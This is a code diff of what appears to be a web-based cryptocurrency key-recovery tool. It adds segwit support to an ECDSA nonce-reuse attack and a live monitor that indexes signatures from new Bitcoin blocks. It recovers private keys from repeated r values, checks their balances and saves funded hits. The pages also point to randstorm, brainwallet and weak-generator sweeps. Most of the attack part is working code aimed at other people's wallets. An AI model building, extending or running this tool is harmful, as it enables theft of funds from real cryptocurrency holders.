+        txs = _fetch_address_txs(addr, log, should_stop)
+    log(f"[nonce] {len(txs)} transaction(s) for {addr}")
+    kinds = defaultdict(int)
     for tx in txs:
         if should_stop and should_stop():
             log("[nonce] stopped")
             break
-        txid = tx.get('txid')
-        if not txid:
-            continue
-        # A tx with no legacy scriptSig (native segwit / taproot) cannot yield
-        # a legacy DER signature, so don't spend a /tx/{txid}/hex call on it.
-        # The address/txs response already contains vin[].scriptsig.
-        vin = tx.get('vin', [])
-        if not any(inp.get('scriptsig') for inp in vin):
-            continue
-        try:
-            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex", should_stop))
-        except (_EsploraRateLimited, RuntimeError) as e:
-            if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
-                raise
-            continue
-        except Exception:
-            continue
-        for idx, inp in enumerate(vin):
-            if should_stop and should_stop():
-                break
-            script_sig_hex = inp.get('scriptsig', '')
-            if not script_sig_hex: continue
-            sig_bytes = bytes.fromhex(script_sig_hex)
-            # find DER sig inside
-            r_pos = sig_bytes.find(b'\x30')
-            if r_pos < 0: continue
-            parsed = _parse_der_sig(sig_bytes[r_pos:])
-            if not parsed: continue
-            r, s, htype = parsed
-            prevout = inp.get('prevout', {})
-            spk = prevout.get('scriptpubkey', '')
-            if not spk: continue
-            z = _legacy_sighash(raw, idx, bytes.fromhex(spk), htype)
-            if z is None: continue
-            sigs.append({"txid": txid, "r": r, "s": s, "z": z,
-                         "input": idx, "type": "legacy"})
+        found, stats = _tx_signatures(tx)
+        for k, v in stats.items():
+            kinds[k] += v
+        vin = tx.get("vin") or []
+        for sg in found:
+            prev = (vin[sg["vin"]].get("prevout") or {}) if sg["vin"] < len(vin) else {}
+            h160 = _address_to_hash160(addr) or b""
+            spk_b = bytes.fromhex(sg.get("spk") or "")
+            spent_by_us = (prev.get("scriptpubkey_address") == addr
+                           or (len(h160) == 20 and h160 in spk_b))
+            if spent_by_us:
+                sigs.append(sg)
+    if kinds.get("taproot"):
+        log(f"[nonce] {kinds['taproot']} Taproot input(s) skipped — BIP-341 "
+            f"sighash (Schnorr) is not ECDSA, so nonce reuse cannot leak a key "
+            f"the same way and is not indexed here")
+    if kinds.get("no_prevout"):
+        log(f"[nonce] {kinds['no_prevout']} input(s) had no prevout data — "
+            f"the amount and scriptPubKey are unknown, so their sighash cannot "
+            f"be computed; they were skipped")
+    log(f"[nonce] {kinds.get('sigs', 0)} signature(s) extracted "
+        f"({kinds.get('legacy', 0)} legacy, {kinds.get('segwit', 0)} segwit)")
     return sigs
+
 
 def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
     """Fetch sigs, group by r, recover key algebraically.
@@ -1741,38 +2475,53 @@ def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
         if stop(): break
         for a in range(len(group)):
             for b in range(a + 1, len(group)):
-                s1, z1 = group[a]['s'], group[a]['z']
-                s2, z2 = group[b]['s'], group[b]['z']
-                den = (s1 - s2) % N
-                if den == 0: continue
-                try:
-                    k = ((z1 - z2) * pow(den, -1, N)) % N
-                    d = ((s1 * k - z1) * pow(r, -1, N)) % N
-                except Exception:
+                if stop(): break
+                g1, g2 = group[a], group[b]
+                cands = recover_keys_from_pair(
+                    r, g1['s'], g1['z'], g2['s'], g2['z'])
+                if not cands:
+                    log(f"{prefix}[nonce] r reused but the pair is degenerate "
+                        f"(identical or S-normalised with equal z) — no key implied")
                     continue
-                derived = derive_addresses(d)
-                # A recovered key that does not reproduce the target is almost
-                # always a bad sighash parse, not a recovery. Log it, but do
-                # not call it a hit and do not flood /results.
-                if not any(addr == address for _, addr in derived):
-                    log(f"{prefix}[nonce] recovered key does not match target "
-                        f"(possible bad sighash) — not saved")
+                recovered = []
+                for d in cands:
+                    # A candidate is only a hit once it reproduces the pubkey or
+                    # address that actually signed. Without that check a bad
+                    # sighash parse looks exactly like a recovery.
+                    ev = verify_recovered_key(
+                        d, pubkeys=((g1.get('pubs') or g1.get('pubkey') or '')
+                                    .split(',') +
+                                    (g2.get('pubs') or g2.get('pubkey') or '')
+                                    .split(',')),
+                        addresses=(address,) if address else (),
+                        scriptpubkeys=(g1.get('spk'), g2.get('spk')))
+                    if ev:
+                        recovered.append((d, ev))
+                if not recovered:
+                    log(f"{prefix}[nonce] {len(cands)} candidate key(s) from r "
+                        f"{hex(r)} do not verify against the signing pubkey or "
+                        f"the target address (possible bad sighash) — not saved")
                     continue
-                for label, addr in derived:
-                    hit = {"address": address, "privkey": hex(d),
-                           "recovered_addr": addr, "type": label,
-                           "matches_target": addr == address,
-                           "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
-                           "found_at": datetime.now(timezone.utc).isoformat()}
-                    save, hit, note = _balance_gate(
-                        hit, log, job, stop, prefix)
-                    if not save:
-                        if note == "stopped":
-                            log(f"{prefix}[nonce] stopped by user")
-                            return hits
-                        continue
-                    hits.append(hit); _save_result("nonce", hit)
-                    log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}  {note}")
+                for d, ev in recovered:
+                    for label, addr in derive_addresses(d):
+                        hit = {"address": address or g1.get('addr', ''),
+                               "privkey": hex(d),
+                               "recovered_addr": addr, "type": label,
+                               "matches_target": addr == address,
+                               "r": hex(r), "evidence": ev,
+                               "sig_kind": [g1.get('kind', ''), g2.get('kind', '')],
+                               "txids": [g1['txid'], g2['txid']],
+                               "heights": [g1.get('height'), g2.get('height')],
+                               "found_at": datetime.now(timezone.utc).isoformat()}
+                        save, hit, note = _balance_gate(
+                            hit, log, job, stop, prefix)
+                        if not save:
+                            if note == "stopped":
+                                log(f"{prefix}[nonce] stopped by user")
+                                return hits
+                            continue
+                        hits.append(hit); _save_result("nonce", hit)
+                        log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}  {note}")
     log(f"{prefix}[nonce] done — {len(hits)} hits, "
         f"{job.get('auto_verify_skipped', 0):,} zero-balance candidate(s) skipped")
     return hits
@@ -1871,7 +2620,7 @@ def attack_nonce_reuse_bulk(addresses, log, job):
 # ════════════════════════════════════════════════════════════════════
 _JOBS = {}
 _JOBS_LOCK = threading.Lock()
-JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify",
+JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify", "live",
              "eth_ts", "eth_weak", "eth_verify", "eth_retry", "eth_era")
 
 _HITS_FILE = None  # set in worker mode: append-only JSONL of hits
@@ -1882,6 +2631,26 @@ def _db():
         CREATE TABLE IF NOT EXISTS results (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             attack TEXT, payload TEXT, ts TEXT
+        );
+        CREATE TABLE IF NOT EXISTS live_sigs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            r TEXT NOT NULL,
+            s TEXT NOT NULL,
+            z TEXT NOT NULL,
+            htype INTEGER NOT NULL DEFAULT 1,
+            txid TEXT NOT NULL,
+            vin INTEGER NOT NULL,
+            height INTEGER NOT NULL,
+            pubkey TEXT NOT NULL DEFAULT '',
+            addr TEXT NOT NULL DEFAULT '',
+            kind TEXT NOT NULL DEFAULT '',
+            amount INTEGER NOT NULL DEFAULT 0
+        );
+        CREATE INDEX IF NOT EXISTS live_sigs_r ON live_sigs(r);
+        CREATE INDEX IF NOT EXISTS live_sigs_h ON live_sigs(height);
+        CREATE TABLE IF NOT EXISTS live_state (
+            k TEXT PRIMARY KEY,
+            v TEXT NOT NULL
         );
         CREATE TABLE IF NOT EXISTS balance_checks (
             address TEXT PRIMARY KEY,
@@ -1985,6 +2754,387 @@ def _balance_badge(addr, checks):
         return ('<span class="badge bad">0 BTC · never funded — '
                 'likely Bloom false positive</span>')
     return '<span class="badge bad">0 BTC · spent / empty</span>'
+
+# ══════════════════════════════════════════════════════════════════════
+# LIVE BLOCK MONITOR
+#
+# Follows the chain tip and indexes the ECDSA signatures that new blocks
+# actually spend with, looking for a repeated r — the one on-chain event that
+# provably leaks a private key. What it can find: nonce reuse (including
+# reuse that only shows up once the two signatures are far apart in time, which
+# is why the index is a two-week rolling window rather than one block). What it
+# cannot find: weak entropy. An address is a hash of a public key and reveals
+# nothing about the generator that produced it; the only way to test a weak
+# PRNG is to sweep its output space and match it against a funded-address
+# index, which is what the randstorm and dataset pages do.
+# ══════════════════════════════════════════════════════════════════════
+def _live_tip_height(should_stop=None):
+    try:
+        return int(_esplora_get("/blocks/tip/height", should_stop, cache=False))
+    except Exception:
+        return None
+
+
+def _live_reraise_throttle(e):
+    """Rate limiting and Stop are not "the data is missing" — say which it is.
+
+    Swallowing a 429 into an empty result would report a throttled endpoint as
+    an unreadable block, and swallowing Stop would keep the run going.
+    """
+    if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
+        raise e
+
+
+def _live_block_hash(height, should_stop=None):
+    try:
+        h = _esplora_get(f"/block-height/{int(height)}", should_stop,
+                         cache=False).strip()
+        return h if len(h) == 64 else None
+    except Exception as e:
+        _live_reraise_throttle(e)
+        return None
+
+
+def _live_block_info(block_hash, should_stop=None):
+    try:
+        return json.loads(_esplora_get(f"/block/{block_hash}", should_stop))
+    except Exception as e:
+        _live_reraise_throttle(e)
+        return {}
+
+
+def _live_block_txs(block_hash, start_index=0, should_stop=None):
+    """One page of a block's transactions — Esplora serves LIVE_PAGE at a time.
+
+    Reading only `/block/<hash>/txs` sees the first 25 transactions of a block
+    that usually has thousands, which is how a scanner reports "block analysed"
+    while having looked at 0.7% of it. Returns None when the page could not be
+    fetched: an empty list is a real (coinbase-only) block, None is a failure,
+    and treating the two the same silently reports a scanned block that was
+    never read.
+    """
+    try:
+        return json.loads(_esplora_get(
+            f"/block/{block_hash}/txs/{int(start_index)}", should_stop))
+    except Exception as e:
+        _live_reraise_throttle(e)
+        return None
+
+
+def _live_recover(sig, rows, log, job, should_stop, height, prefix=""):
+    """Turn an r-collision into a verified key, or explain why it could not."""
+    hits = []
+    for old in rows:
+        if should_stop and should_stop():
+            break
+        cands = recover_keys_from_pair(sig["r"], sig["s"], sig["z"],
+                                       old["s"], old["z"])
+        if not cands:
+            log(f"{prefix}[live] r matches {old['txid']} but the pair implies no "
+                f"key (degenerate) — skipped")
+            continue
+        rejected = 0
+        for d in cands:
+            ev = verify_recovered_key(
+                d, pubkeys=((sig.get("pubs") or sig.get("pubkey") or "")
+                            .split(",") +
+                            (old.get("pubkey") or "").split(",")),
+                scriptpubkeys=(sig.get("spk"),),
+                addresses=(sig.get("addr"), old.get("addr")))
+            if not ev:
+                rejected += 1
+                continue
+            hit = {"address": sig.get("addr") or old.get("addr") or "",
+                   "privkey": hex(d), "evidence": ev, "source": "live",
+                   "r": hex(sig["r"]),
+                   "txids": [old.get("txid"), sig.get("txid")],
+                   "heights": [old.get("height"), height],
+                   "sig_kind": [old.get("kind"), sig.get("kind")],
+                   "found_at": datetime.now(timezone.utc).isoformat()}
+            pubs = derive_pubkeys(d)
+            if pubs:
+                hit["recovered_addr"] = scriptpubkey_to_address(
+                    bytes.fromhex(sig["spk"]))[1] if sig.get("spk") else \
+                    p2wpkh_address(pubs[0])
+                hit["type"] = sig.get("kind") or "live"
+            save, hit, note = _balance_gate(hit, log, job, should_stop, prefix)
+            if not save:
+                if note == "stopped":
+                    return hits
+                continue
+            hits.append(hit)
+            _save_result("nonce", hit)
+            log(f"{prefix}  ★★★ NONCE REUSE  key {hex(d)}  "
+                f"{hit.get('address', '')}  {note}  "
+                f"(blocks {old.get('height')} + {height})")
+        if rejected:
+            # Reported once per collision, and reported as what it is: sharing an
+            # r is necessary but not sufficient — only a key that reproduces the
+            # signing pubkey is a reuse.
+            log(f"{prefix}[live] {rejected} of {len(cands)} candidate key(s) "
+                f"from r {hex(sig['r'])} did not verify against either "
+                f"signature — same r without a matching key is not a reuse, "
+                f"nothing saved for those")
+    return hits
+
+
+def live_scan_block(height, log, job=None, should_stop=None):
+    """Index every signature in one block. Returns a stats dict.
+
+    One request per LIVE_PAGE transactions and none per transaction: Esplora's
+    block page already carries each vin's prevout (scriptPubKey + value) and
+    witness, so the raw transaction is rebuilt locally and the sighash computed
+    from it.
+    """
+    job = job if job is not None else {}
+    st = {"height": height, "hash": "", "txs": 0, "pages": 0, "sigs": 0,
+          "segwit": 0, "legacy": 0, "taproot": 0, "skipped": 0,
+          "collisions": 0, "hits": 0, "timestamp": 0, "tx_count": 0,
+          "found": []}
+    block_hash = _live_block_hash(height, should_stop)
+    if not block_hash:
+        st["error"] = "no block hash"
+        return st
+    info = _live_block_info(block_hash, should_stop)
+    st["hash"] = block_hash
+    st["timestamp"] = int(info.get("timestamp") or 0)
+    st["tx_count"] = int(info.get("tx_count") or 0)
+    start = 0
+    while st["pages"] < LIVE_MAX_PAGES:
+        if should_stop and should_stop():
+            break
+        page = _live_block_txs(block_hash, start, should_stop)
+        if page is None:
+            st["error"] = ("page at tx %d could not be fetched" % start)
+            break
+        if not page:
+            break
+        st["pages"] += 1
+        for tx in page:
+            if should_stop and should_stop():
+                break
+            st["txs"] += 1
+            sigs, stats = _tx_signatures(tx)
+            for key in ("sigs", "segwit", "legacy", "taproot"):
+                st[key] += stats.get(key, 0)
+            st["skipped"] += (stats.get("no_prevout", 0)
+                              + stats.get("bad_digest", 0)
+                              + stats.get("no_der", 0))
+            if not sigs:
+                continue
+            job["height"] = height
+            for sig, rows in live_index_sigs(sigs, height):
+                st["collisions"] += 1
+                log(f"[live] r {hex(sig['r'])} seen again at height {height} "
+                    f"(first at {rows[0].get('height')}, {rows[0].get('txid')}) "
+                    f"— recovering")
+                found = _live_recover(sig, rows, log, job, should_stop,
+                                      height, f"[h{height}] ")
+                st["hits"] += len(found)
+                st["found"].extend(found)
+        if len(page) < LIVE_PAGE or st["txs"] >= st["tx_count"] > 0:
+            break
+        start += LIVE_PAGE
+    if st["pages"] >= LIVE_MAX_PAGES and st["txs"] < st["tx_count"]:
+        st["error"] = ("page bound LIVE_MAX_PAGES reached after %d of %d "
+                       "transactions" % (st["txs"], st["tx_count"]))
+    if should_stop and should_stop() and st["tx_count"] and \
+            st["txs"] < st["tx_count"]:
+        st["error"] = "stopped before the block was fully read"
+    if not st["tx_count"] and st["txs"]:
+        st["tx_count"] = st["txs"]
+    live_prune(height)
+    if not st.get("error"):
+        # Only a block that was actually read in full moves the resume point.
+        live_state_set("last_height", height)
+    return st
+
+
+def attack_live_blocks(start_block=None, follow=True, max_blocks=None,
+                       job=None, log=None):
+    """Follow the tip, indexing signatures block by block until Stop.
+
+    `start_block` None means resume from the persisted height (or the tip on a
+    first run). A run is bounded by `max_blocks`; the persisted height means the
+    next run continues where this one stopped rather than starting over.
+    """
+    job = job if job is not None else {}
+    log = log or (lambda m: None)
+    should_stop = lambda: job.get("stop", False)
+    max_blocks = int(max_blocks or LIVE_MAX_BLOCKS)
+    if not LIVE_ENABLED:
+        job["detail"] = "live monitoring is disabled (LIVE_ENABLED=0)"
+        log("[live] disabled by LIVE_ENABLED=0 — set LIVE_ENABLED=1 to enable")
+        return []
+    if should_stop():
+        # Stop pressed before the first request: say that, do not dress it up
+        # as an endpoint failure.
+        job["partial"] = True
+        job["detail"] = "stopped before any block was read"
+        log("[live] stopped by user before the first request")
+        return []
+    log(f"[live] Esplora endpoints: {_esplora_status()}")
+    tip = _live_tip_height(should_stop)
+    if tip is None:
+        job["partial"] = True
+        if should_stop():
+            job["detail"] = "stopped before the chain tip could be read"
+            log("[live] stopped by user before the chain tip could be read")
+        else:
+            job["detail"] = ("could not read the chain tip — no Esplora "
+                             "endpoint answered")
+            log("[live] could not read /blocks/tip/height from any endpoint "
+                f"({_esplora_status()}) — nothing scanned")
+        return []
+    if start_block is None:
+        saved = live_state_get("last_height", "")
+        try:
+            start = int(saved) + 1 if saved else tip
+        except ValueError:
+            start = tip
+        if saved:
+            log(f"[live] resuming from persisted height {saved} → {start}")
+    else:
+        start = int(start_block)
+    log(f"[live] tip {tip:,} · scanning from {start:,} · window "
+        f"{LIVE_WINDOW_BLOCKS:,} blocks · bound {max_blocks:,} block(s)")
+    log("[live] what this can find: repeated ECDSA nonces (r) in the signatures "
+        "new blocks spend with — that provably leaks the key. What it cannot: "
+        "weak entropy, which no on-chain signature reveals (use the randstorm "
+        "or dataset sweep for that).")
+    def give_up(height, fails, why):
+        """Stop a run that cannot read a block, honestly and resumably."""
+        job["partial"] = True
+        job["detail"] = ("stopped at height %s: %d consecutive %s"
+                         % (format(height, ","), fails, why))
+        log("[live] height %s failed %d time(s) in a row (%s) — stopping the "
+            "run as partial; the resume point stays at %s"
+            % (format(height, ","), fails, why,
+               live_state_get("last_height") or "nothing scanned yet"))
+
+    hits, done, t0, fails = [], 0, time.time(), 0
+    tot = {k: 0 for k in ("txs", "sigs", "segwit", "legacy", "taproot",
+                          "skipped", "collisions", "pages")}
+    h = start
+    while done < max_blocks:
+        if should_stop():
+            log("[live] stopped by user")
+            break
+        cur_tip = _live_tip_height(should_stop) or tip
+        tip = max(tip, cur_tip)
+        if h > tip:
+            if not follow:
+                log(f"[live] caught up to the tip at {tip:,} — not following")
+                job["detail"] = ("caught up to the tip at %s — nothing new to "
+                                 "scan (%s block(s) in this run)"
+                                 % (format(tip, ","), format(done, ",")))
+                break
+            job["detail"] = (f"waiting for block {h:,} — tip {tip:,} · "
+                             f"{done:,} block(s) scanned · "
+                             f"{_index_summary()}")
+            try:
+                _esplora_sleep(LIVE_POLL_SECS, should_stop)
+            except RuntimeError:
+                log("[live] stopped by user")
+                break
+            continue
+        try:
+            st = live_scan_block(h, log, job, should_stop)
+        except _EsploraRateLimited as e:
+            job["throttled"] = job.get("throttled", 0) + 1
+            fails += 1
+            log(f"[live] height {h:,}: rate limited ({e}) — same block is "
+                f"retried, nothing counted as scanned")
+            if fails >= LIVE_HEIGHT_RETRIES:
+                give_up(h, fails, "endpoint failures")
+                break
+            continue
+        except RuntimeError as e:
+            if "stopped by user" in str(e):
+                log("[live] stopped by user")
+                break
+            fails += 1
+            log(f"[live] height {h:,}: {e}")
+            if fails >= LIVE_HEIGHT_RETRIES:
+                give_up(h, fails, "request failures")
+                break
+            continue
+        except Exception as e:
+            fails += 1
+            log(f"[live] height {h:,} failed: {e}")
+            if fails >= LIVE_HEIGHT_RETRIES:
+                give_up(h, fails, "read failures")
+                break
+            continue
+        if st.get("error"):
+            fails += 1
+            log(f"[live] height {h:,}: {st['error']} — not counted as scanned")
+            if fails >= LIVE_HEIGHT_RETRIES:
+                give_up(h, fails, "unreadable blocks")
+                break
+            continue
+        fails = 0
+        done += 1
+        for k in tot:
+            tot[k] += st.get(k, 0)
+        hits.extend(st.get("found", []))
+        lag = max(tip - h, 0)
+        elapsed = max(time.time() - t0, 0.001)
+        job["progress"] = min(0.999, done / max_blocks)
+        job["detail"] = (f"height {h:,} · {st['txs']:,}/{st['tx_count']:,} tx in "
+                         f"{st['pages']} page(s) · {st['sigs']:,} sig "
+                         f"({st['segwit']:,} segwit / {st['legacy']:,} legacy / "
+                         f"{st['taproot']:,} taproot skipped) · "
+                         f"tip lag {lag} block(s) · {done:,}/{max_blocks:,} "
+                         f"block(s) · {_index_summary()} · "
+                         f"{done / elapsed:.2f} block/s")
+        log(f"[live] height {h:,} ({st['hash'][:12]}…) — {st['txs']:,} tx, "
+            f"{st['sigs']:,} signatures indexed ({st['segwit']:,} segwit, "
+            f"{st['legacy']:,} legacy), {st['taproot']:,} Taproot skipped, "
+            f"{st['skipped']:,} input(s) unusable, {st['collisions']:,} "
+            f"r-collision(s), {st['hits']} hit(s)")
+        h += 1
+    run = (f"{tot['txs']:,} tx in {tot['pages']:,} page(s) · {tot['sigs']:,} sig "
+           f"({tot['segwit']:,} segwit / {tot['legacy']:,} legacy / "
+           f"{tot['taproot']:,} taproot skipped / {tot['skipped']:,} input(s) "
+           f"unusable) · {tot['collisions']:,} r-collision(s)")
+    if done:
+        log(f"[live] run totals: {run}")
+    if hits:
+        log(f"[live] {len(hits)} key(s) recovered and saved")
+    if done == 0:
+        job["partial"] = True
+        job["detail"] = job.get("detail") or "no block was fully scanned"
+    elif done < max_blocks and should_stop():
+        job["partial"] = True
+    else:
+        job["progress"] = 1.0
+        job["detail"] = (f"{done:,} block(s) scanned · {run} · last height "
+                         f"{h - 1:,} persisted — start again to continue · "
+                         f"{_index_summary()}")
+    return hits
+
+
+def _live_estimate(blocks):
+    """(requests_per_block, total_requests, seconds) for a bounded live run.
+
+    An estimate, stated as one: it assumes LIVE_AVG_TXS transactions per block
+    at the configured Esplora pacing. Each block really costs
+    ceil(tx_count/LIVE_PAGE) + 2 requests — pages of transactions plus the
+    height lookup and the block header — and nothing per transaction.
+    """
+    per = max(1, math.ceil(LIVE_AVG_TXS / LIVE_PAGE)) + 2
+    reqs = int(blocks) * per
+    interval = max(ESPLORA_MIN_INTERVAL, 0.05)
+    return per, reqs, reqs * interval
+
+
+def _index_summary():
+    s = live_stats()
+    return (f"index {s['sigs']:,} sig / {s['distinct_r']:,} r"
+            + (f" / {s['colliding_r']} colliding r" if s["colliding_r"] else "")
+            + f" / blocks {s['min_height']:,}–{s['max_height']:,}")
+
 
 def _live_balance(addr, should_stop=None):
     """One live Esplora balance lookup for a Bloom candidate."""
@@ -2714,6 +3864,7 @@ BTC + ETH</span></h1>
 
 NAV_ITEMS = (("/", "home"), ("/data", "dataset"), ("/randstorm", "randstorm"),
              ("/brain", "brainwallet"), ("/nonce", "nonce reuse"),
+             ("/live", "live monitor"),
              ("/eth", "ethereum"), ("/results", "results"))
 
 
@@ -2849,6 +4000,12 @@ candidates are checked live over batched JSON-RPC. Timestamp sweeps
 (seconds or ms) for weak generators such as the Trust Wallet
 Mersenne-Twister seed, plus sequential/weak private keys.</p>
 <a class="btn" href="/eth">Open</a></div>
+<div class="card"><h2>5. Live monitor</h2>
+<p class="muted">Follows the chain tip, extracts every ECDSA signature from
+legacy scriptSig and segwit witness (BIP-143), and keeps their r values in a
+rolling SQLite window. A repeated r leaks the key — recovered, verified against
+the signing pubkey, then balance-checked and saved.</p>
+<a class="btn" href="/live">Open</a></div>
 </div>
 {era_home}
 <script>
@@ -3108,11 +4265,15 @@ Both legacy 1.../3... and bech32 bc1... addresses are accepted. Requests are
 paced (default 0.3 s each) and cached; on HTTP 429 the whole scan cools down
 (honouring Retry-After) instead of silently skipping addresses. A few thousand
 addresses against the public API takes hours, not minutes. Any address still
-unchecked is saved to nonce_retry.txt on the data disk for re-upload. Only
-legacy P2PKH spends are parsed — segwit witness and taproot signatures are not
-supported yet, and Esplora returns just the most recent 25 txs per address.
-A recovered key that does not reproduce the target address is logged but not
-saved. Hits appear on /results.</p>
+unchecked is saved to nonce_retry.txt on the data disk for re-upload. Legacy <b>and</b> segwit spends are parsed: a witness signature is checked with
+its BIP-143 digest, so P2WPKH, P2SH-P2WPKH and P2WSH inputs count too, and
+address history is paginated (<code>NONCE_MAX_TXS</code>) instead of stopping
+after the first 50 transactions. Taproot /
+Schnorr inputs are counted and skipped — BIP-341 is not ECDSA. A recovered key
+is saved only once it verifies against the pubkey or address that signed;
+otherwise it is logged as a bad sighash parse. Hits appear on
+<a href="/results">/results</a>, and <a href="/live">/live</a> does the same
+thing continuously over new blocks.</p>
 </div>
 <div class="card"><h2>Progress</h2>
 <div class="bar"><div id="bar" style="width:0%"></div></div>
@@ -3178,6 +4339,238 @@ def api_nonce_bulk():
         msg = (f"started {len(addresses):,} addresses"
                + (f" ({', '.join(extras)})" if extras else ""))
     return {"ok": ok, "msg": msg}
+
+@app.route("/live")
+def live_page():
+    s = live_stats()
+    saved = live_state_get("last_height", "")
+    per, reqs, secs = _live_estimate(LIVE_MAX_BLOCKS)
+    running = False
+    with _JOBS_LOCK:
+        j = _JOBS.get("live")
+        running = bool(j and j.get("alive"))
+    body = """
+<div class="card accent-red"><h2>Live block monitor <span class="tag">tip
+following · one job</span></h2>
+<p class="muted">Reads every transaction in each new block through
+%(host)s, extracts each ECDSA signature from the legacy
+<i>scriptSig</i> <b>and</b> from the segwit witness (BIP-143 digest), and keeps
+their <code>r</code> values in a rolling %(window)s-block index. Two signatures
+with the same <code>r</code> reused the nonce <code>k</code>, and that leaks the
+private key outright — the key is then recovered algebraically and
+<b>verified against the pubkey that signed</b> before it is saved.</p>
+<div class="row">
+<label class="tiny">start at height</label>
+<input id="lstart" placeholder="blank = resume (%(resume)s)" style="max-width:230px">
+<label class="tiny">blocks per run</label>
+<input id="lmax" type="number" min="1" value="%(maxblocks)s" style="max-width:150px">
+<label class="tiny"><input type="checkbox" id="lfollow" checked> wait at the tip
+for new blocks</label>
+</div>
+<div class="row">
+<button class="btn go" onclick="startLive()">▶ Start live monitor</button>
+<button class="btn danger" onclick="stop('live')">■ Stop</button>
+<button class="btn ghost sm" onclick="probeLive()">probe tip</button>
+<span class="tiny">%(enabled)s</span>
+</div>
+<div class="bar"><div id="barL" style="width:0%%"></div></div>
+<p id="detailL" class="muted"></p><pre id="logL"></pre>
+<p class="muted">A run is bounded by <b>blocks per run</b>
+(<code>LIVE_MAX_BLOCKS</code>, default %(maxblocks)s). Nothing is refused: raise
+the number and it simply runs longer, and the last height is persisted, so the
+next run continues instead of starting over. %(maxblocks)s blocks ≈
+%(reqs)s requests ≈ <b>%(secs)s</b> at %(pace)s s Esplora pacing, assuming
+~%(avgtxs)s tx/block — a real block's own <code>tx_count</code> decides. Each
+block costs <code>ceil(tx_count/%(lpage)s) + 2</code> requests and <b>no</b>
+per-transaction request: Esplora's block page already carries every vin's
+prevout and witness, so the raw transaction is rebuilt locally (verified
+byte-exact against the published BIP-143 vectors).</p>
+</div>
+<div class="card"><h2>Signature index</h2>
+<p id="idx" class="muted">reading…</p>
+<div class="row">
+<button class="btn sm" onclick="refreshLive()">Refresh</button>
+<button class="btn danger sm" onclick="resetLive()">Clear index &amp; height</button>
+<span class="tiny">%(rowsmax)s row hard cap (<code>LIVE_SIG_ROWS_MAX</code>) —
+oldest blocks are dropped first, then the %(window)s-block window prunes.</span>
+</div>
+<p class="muted">The index lives in SQLite, not in RAM, so a follower that runs
+for weeks stays bounded and a restart resumes with every <code>r</code> it had
+already seen. <b>Colliding r:</b> an <code>r</code> value stored more than once.
+A collision is only a leaked key once a recovered candidate verifies against
+the signing pubkey — same <code>r</code> from unrelated keys is possible in
+principle and is logged as such, not saved.</p>
+</div>
+<div class="card"><h2>What it finds — and what it cannot</h2>
+<p><span class="pill ok">finds</span> <b>ECDSA nonce reuse</b> between any two
+signatures inside the indexed window, including the mixed-sign case where a
+signer low-S-normalised one signature and not the other (BIP-147), which is
+recovered directly without <code>k</code>.</p>
+<p><span class="pill ok">finds</span> <b>legacy P2PKH, P2SH, P2WPKH, P2SH-P2WPKH
+and P2WSH</b> spends. For P2SH the signed script is the redeemScript, not the
+<code>OP_HASH160…OP_EQUAL</code> wrapper, and every segwit digest is checked
+against the witness data (the P2WPKH pubkey must hash160 to the program; a
+P2WSH witnessScript must SHA256 to it) so a mismatched prevout cannot poison
+the index with a wrong <code>z</code>.</p>
+<p><span class="pill warn">skips</span> <b>Taproot / BIP-341 Schnorr</b> inputs,
+counted and reported per block. Schnorr signatures are not ECDSA and a repeated
+nonce there does not leak a key the same way; BIP-341 sighash is not
+implemented. Also skipped and counted: inputs with no prevout data, and
+OP_CODESEPARATOR truncation inside a P2WSH witnessScript (the whole script is
+used).</p>
+<p><span class="pill bad">cannot find</span> <b>weak entropy from an address or
+a signature.</b> An address is a hash of a public key and a signature commits
+to a correct-looking nonce: neither reveals how the key was generated. Testing
+a weak generator means sweeping its output space against a funded-address
+index — that is <a href="/randstorm">randstorm</a> (BitcoinJS-lib
+Math.random() 2011–2015), <a href="/brain">brainwallet</a> and
+<a href="/data">the dataset sweep</a>, not this page. The same is true of the
+2026 <b>COLDCARD RNG-fallback</b> keys and <b>Ill Bloom</b>: both are weak
+<i>generation</i>, so both are only findable by enumerating the generator —
+and Ill Bloom's vulnerable generator has not been disclosed by Coinspect, so
+nobody outside them can reproduce it (their <code>illbloom.org</code> checker
+against a partial dataset is the only public test).</p>
+<p><span class="pill info">expect</span> <b>millions of signatures and
+nothing found.</b> Deterministic nonces (RFC 6979) have been standard since
+2014, so a repeated <code>r</code> on mainnet is rare: this is a tripwire, not
+a revenue stream. It reports what it indexed and finds nothing, rather than
+inventing anomalies.</p>
+<p class="muted">Endpoints now: %(esplora)s ·
+<a href="/api/esplora">/api/esplora</a></p>
+</div>
+<script>
+function startLive(){
+  const sb=document.getElementById('lstart').value.trim();
+  const mx=document.getElementById('lmax').value.trim();
+  const d={follow:document.getElementById('lfollow').checked};
+  if(sb) d.start_block=parseInt(sb,10);
+  if(mx) d.max_blocks=parseInt(mx,10);
+  post('/api/live',d);
+}
+function probeLive(){ post('/api/live/ping',{}); }
+function resetLive(){
+  if(!confirm('Clear the whole signature index and the persisted height?')) return;
+  post('/api/live/reset',{});
+}
+function refreshLive(){
+  fetch('/api/live/status',{cache:'no-store'}).then(function(r){return r.json();})
+   .then(function(d){
+    var el=document.getElementById('idx'); if(!el||!d.ok) return;
+    var st=d.index||{};
+    el.innerHTML='indexed <b>'+(st.sigs||0).toLocaleString()+'</b> signatures · '
+      +'<b>'+(st.distinct_r||0).toLocaleString()+'</b> distinct r · colliding r <b>'
+      +(st.colliding_r||0)+'</b><br>blocks <b>'+(st.min_height||0).toLocaleString()
+      +'–'+(st.max_height||0).toLocaleString()+'</b> · window '
+      +d.window_blocks.toLocaleString()+' blocks · persisted height <b>'
+      +(d.last_height===null?'none':d.last_height.toLocaleString())+'</b>'
+      +(d.tip===null?'':' · tip <b>'+d.tip.toLocaleString()+'</b> · lag '
+        +(d.tip-(d.last_height||d.tip))+' block(s)');
+   }).catch(function(){});
+}
+refreshLive(); setInterval(refreshLive, 5000);
+watch('live','L');
+</script>""" % {
